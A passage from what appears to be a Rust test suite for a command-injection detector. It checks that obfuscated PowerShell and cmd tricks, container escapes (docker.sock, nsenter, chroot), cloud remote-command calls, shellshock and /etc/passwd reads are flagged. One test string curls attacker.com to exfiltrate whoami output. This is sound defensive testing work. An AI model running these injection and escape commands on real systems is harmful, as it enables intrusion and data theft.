        let dets = eval.detect("pwsh -c ('w'+'ho'+'ami')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_string_concat")
        );
    }

    #[test]
    fn ps_variable_env_expansion_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("powershell -c $env:ComSpec /c whoami");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_variable_expansion")
        );
    }

    #[test]
    fn ps_variable_plain_expansion_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("pwsh -c $cmd $arg");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_variable_expansion")
        );
    }

    #[test]
    fn ps_format_operator_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("powershell -c '{1}{0}' -f 'ami','who'");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_format_operator")
        );
    }

    #[test]
    fn ps_format_operator_with_variable_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("pwsh -c '{0}\\{1}' -f $env:windir,'System32'");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_format_operator")
        );
    }

    #[test]
    fn windows_caret_escape_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("cmd /c w^h^o^a^m^i");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_caret_escaping")
        );
    }

    #[test]
    fn windows_caret_escape_uppercase_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("CMD /C D^I^R");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_caret_escaping")
        );
    }

    #[test]
    fn windows_comspec_substitution_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("%comspec% /c whoami");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_comspec_substitution")
        );
    }

    #[test]
    fn windows_comspec_with_path_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("%COMSPEC%\\System32\\cmd.exe /c dir");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_comspec_substitution")
        );
    }

    #[test]
    fn windows_for_f_loop_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("cmd /c for /f \"tokens=*\" %i in ('whoami') do %i");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_for_f_loop")
        );
    }

    #[test]
    fn windows_for_f_with_usebackq_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("for /f usebackq %a in (`dir`) do echo %a");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_for_f_loop")
        );
    }

    #[test]
    fn windows_wmic_process_create_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("wmic process call create \"cmd.exe /c calc.exe\"");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_wmic_process_create")
        );
    }

    #[test]
    fn windows_wmic_process_create_with_powershell_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("WMIC process CALL create \"powershell -enc AAAA\"");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "windows_wmic_process_create")
        );
    }

    #[test]
    fn bash_process_substitution_new_detector() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("cat <(whoami)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "bash_process_substitution")
        );
    }

    #[test]
    fn bash_here_string_new_detector() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("grep root <<<$(cat /etc/passwd)");
        assert!(dets.iter().any(|d| d.detection_type == "bash_here_string"));
    }

    #[test]
    fn bash_ansi_c_quote_new_detector() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("$'\\x77\\x68\\x6f\\x61\\x6d\\x69'");
        assert!(dets.iter().any(|d| d.detection_type == "bash_ansi_c_quote"));
    }

    #[test]
    fn bash_brace_expansion_new_detector() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("{echo,hello}");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "bash_brace_expansion")
        );
    }

    #[test]
    fn container_docker_socket_path_detected() {
        let eval = CmdInjectionEvaluator;
        let dets =
            eval.detect("curl --unix-socket /var/run/docker.sock http://localhost/containers/json");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_docker_socket_escape")
        );
    }

    #[test]
    fn container_docker_socket_host_flag_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("docker -H unix:///var/run/docker.sock run --privileged alpine sh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_docker_socket_escape")
        );
    }

    #[test]
    fn container_nsenter_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_nsenter_escape")
        );
    }

    #[test]
    fn container_nsenter_short_target_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("nsenter -t 1 -m -u -n -i sh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_nsenter_escape")
        );
    }

    #[test]
    fn container_chroot_breakout_host_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("chroot /host /bin/bash");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_chroot_breakout")
        );
    }

    #[test]
    fn container_chroot_proc_root_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("chroot /proc/1/root /bin/sh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "container_chroot_breakout")
        );
    }

    #[test]
    fn cloud_aws_ssm_send_command_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect(
            "aws ssm send-command --document-name AWS-RunShellScript --parameters commands=whoami",
        );
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_aws_ssm_command")
        );
    }

    #[test]
    fn cloud_aws_ssm_start_session_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("aws ssm start-session --target i-1234567890abcdef0");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_aws_ssm_command")
        );
    }

    #[test]
    fn cloud_gcp_cloud_shell_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("gcloud alpha cloud-shell ssh --authorize-session");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_gcp_cloud_shell")
        );
    }

    #[test]
    fn cloud_gcp_cloudshell_token_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("gcloud cloudshell get-credentials");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_gcp_cloud_shell")
        );
    }

    #[test]
    fn cloud_azure_cloud_shell_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("az cloud-shell create");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_azure_cloud_shell")
        );
    }

    #[test]
    fn cloud_azure_cloudshell_variant_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("az cloudshell ssh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cloud_azure_cloud_shell")
        );
    }

    #[test]
    fn benign_no_ps_context_should_not_trigger_ps_concat() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("math text: 'wh'+'oami'");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "powershell_string_concat")
        );
    }

    #[test]
    fn benign_no_ps_context_should_not_trigger_ps_var_expansion() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("template variable $name for docs");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "powershell_variable_expansion")
        );
    }

    #[test]
    fn benign_word_comspec_without_percent_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("documentation mentions comspec environment variable");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "windows_comspec_substitution")
        );
    }

    #[test]
    fn benign_for_f_phrase_should_not_trigger_loop_detector() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("manual says use for /f only in examples");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "windows_for_f_loop")
        );
    }

    #[test]
    fn benign_docker_sock_like_path_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("/var/run/docker.socket is not the docker.sock endpoint");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "container_docker_socket_escape")
        );
    }

    #[test]
    fn benign_nsenter_word_without_target_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("nsenter command reference page");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "container_nsenter_escape")
        );
    }

    #[test]
    fn benign_chroot_general_usage_should_not_trigger_breakout() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("chroot /srv/chroot /bin/bash");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "container_chroot_breakout")
        );
    }

    #[test]
    fn benign_aws_without_ssm_command_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("aws s3 ls");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "cloud_aws_ssm_command")
        );
    }

    #[test]
    fn benign_gcloud_without_cloud_shell_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("gcloud compute instances list");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "cloud_gcp_cloud_shell")
        );
    }

    #[test]
    fn benign_azure_without_cloud_shell_should_not_trigger() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("az vm list");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "cloud_azure_cloud_shell")
        );
    }

    #[test]
    fn detect_wsl_bash_bypass_positive() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("bash.exe -c 'id'");
        assert!(dets.iter().any(|d| d.detection_type == "wsl_bash_bypass"));
    }

    #[test]
    fn detect_wsl_bash_bypass_negative() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("echo 'bash.exe is cool'");
        assert!(!dets.iter().any(|d| d.detection_type == "wsl_bash_bypass"));
    }

    #[test]
    fn detect_blind_cmdi_dns_positive() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("; curl attacker.com/$(whoami)");
        assert!(dets.iter().any(|d| d.detection_type == "blind_cmdi_dns"));
    }

    #[test]
    fn detect_blind_cmdi_dns_negative() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("curl http://example.com");
        assert!(!dets.iter().any(|d| d.detection_type == "blind_cmdi_dns"));
    }

    #[test]
    fn detect_shellshock_function_injection() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("() { :;}; /bin/bash -c whoami");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shellshock_function_injection")
        );
    }

    #[test]
    fn detect_blind_timing_injection_sleep_chain() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("user=foo; sleep 5");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "blind_timing_injection")
        );
    }

    #[test]
    fn detect_sourced_script_injection() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("ok && source /tmp/payload.sh");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "sourced_script_injection")
        );
    }

    #[test]
    fn detect_process_substitution_lfi() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("diff <(cat /etc/passwd) /tmp/safe.txt");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "process_substitution_lfi")
        );
    }

    #[test]
    fn detect_here_string_injection() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("grep root <<< attacker_payload");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "here_string_injection")
        );
    }
}
